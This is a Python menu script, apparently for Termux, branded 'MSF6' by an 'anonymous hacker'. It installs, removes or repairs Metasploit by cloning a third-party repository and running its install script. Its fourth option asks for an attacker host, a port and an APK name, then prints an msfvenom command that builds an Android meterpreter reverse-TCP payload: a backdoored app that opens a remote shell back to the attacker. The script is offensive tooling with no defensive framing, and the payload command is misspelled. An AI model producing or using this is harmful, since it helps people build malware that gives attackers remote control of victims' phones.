import os
os.system('clear')
import os
stream = os.popen('echo Returned output')
output = stream.read()
output

import sys

from colorama import init
init(strip=not sys.stdout.isatty()) # strip colors if stdout is redirected
from termcolor import cprint 
from pyfiglet import figlet_format

cprint(figlet_format('MSF6', font='starwars'),
        attrs=['bold'])
 
print("\n")
print("                 DEVELOPED BY ANONYMOUS HACKER")
print("\n")

print("_______________________________________")
print("\n")
print("NOW INSTALL METASPLOIT VERY EASILY ***")
print("\n")
print("_______________________________________")
print("\n")

print("{01} INSTALL METASPLOIT FRAMEWORK")
print("\n")
print("{02} UNINSTALL METASPLOIT FRAMEWORK")
print("\n")
print("{03} REPAIR METASPLOIT FRAMEWORK")
print("\n")
print("{04} GENERATE MSFVENOM PAYLOAD... 🚀 🚀 🚀")
print("\n")
print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")

options = input("CHOOSE OPTION :  ")

if options == '1' or options == '01' :
	print("\n")
	print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
	print("\n")
	print("HOLD IT TIGHT THIS PROCESS MIGHT TAKE UP TO 30 MINUTES....")
	print("\n")
	import time
	time.sleep(2)
	print("\n")
	print("METASPLOIT INSTALLING........")
	print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
	print("\n")
	import time
	time.sleep(2)
	print("\n")
	os.system('cd && pkg update && pkg upgrade && pkg install git && git clone https://github.com/verluchie/termux-metasploit && cd termux-metasploit && chmod 777 install.sh && sh install.sh && msfconsole')

if options == '2' or options == '02' :
	print("\n")
	print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
	print("\n")
	print("REMOVING METASPLOIT PLEASE WAIT............")
	print("\n")
	print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
	print("\n")

	
	os.system('cd && rm -rf metasploit-framework && rm -rf metasploit')
	
	print("\n")
	print("METASPLOIT SUCCESFULLY REMOVED......")
	import time
	time.sleep(3)
	
	os.system('cd METASPLOIT-INSTALLER && python3 METASPLOIT-INSTALLER.py')
	

if options == '3' or options == '03' :
	print("\n")
	print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
	print("\n")
	
	print("RESTORING.... METASPLOIT IT MIGHT TAKE UP TO 20 MINUTES....")
	print("\n")
	print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
	print("\n")
	import time
	time.sleep(2)
	print("\n")
	os.system('cd && pkg update && pkg upgrade && pkg install git && git clone https://github.com/verluchie/termux-metasploit && cd termux-metasploit && chmod 777 install.sh && sh install.sh && msfconsole')
	
	print("\n")
	print("METASPLOIT SUCCESFULLY RESTORED........")

if options == '4' or options == '04' :
	print("\n")
	print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
	print("\n")
	lhost = input("ENTER LHOST :  ")
	print("\n")
	lport = input("ENTER LPORT : ")
	print("\n")
	name = input ("ENTER PAYLOAD NAME MUST INCLUDE .apk EXTENSION : ")
	print("\n")
	print("COPY AND PASTE BELOW COMMANDS ON TERMUX 👇👇👇")
	print("\n")
	print("msfvemon -p android/meterpreter/reverse_tcp LHOST=",lhost,"LPORT=",lport,"R > /sdcard/" ,name,)
	print("\n\n")
	print("THANKS FOR USING.......")
	
	


	

	
	


	
	






    	   